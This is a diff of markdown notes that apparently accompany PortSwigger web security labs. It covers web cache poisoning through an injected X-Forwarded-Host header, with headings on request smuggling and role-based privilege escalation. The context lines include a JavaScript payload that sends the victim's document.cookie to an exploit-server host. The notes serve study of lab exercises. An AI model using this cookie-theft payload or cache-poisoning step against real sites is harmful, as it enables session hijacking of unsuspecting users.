@@ -36,15 +36,16 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
 
 >Hosting the following **on exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
 
-![exploit host tracking.js](exploit-host-tracking-js.png)  
-
 ```
  /resources/js/tracking.js 
 ```  
   
+![exploit host tracking.js](exploit-host-tracking-js.png)  
+  
 ```javascript
 document.location='https://exploit.exploit-server.net/cookies?c='+document.cookie;
 ```  
+
 >Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
 
 ![x-cache-hit.png](x-cache-hit.png)  
@@ -397,7 +398,10 @@ x=1
 [PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
 
 
-## PrivEsc JSON RoleId
+## Privilege Escalation  
+  
+  
+### PrivEsc JSON RoleId  
 
 >Access control to the admin interface is based on user roles, and this can lead to IDOR or accessc ontrol security vulnerability.  
 
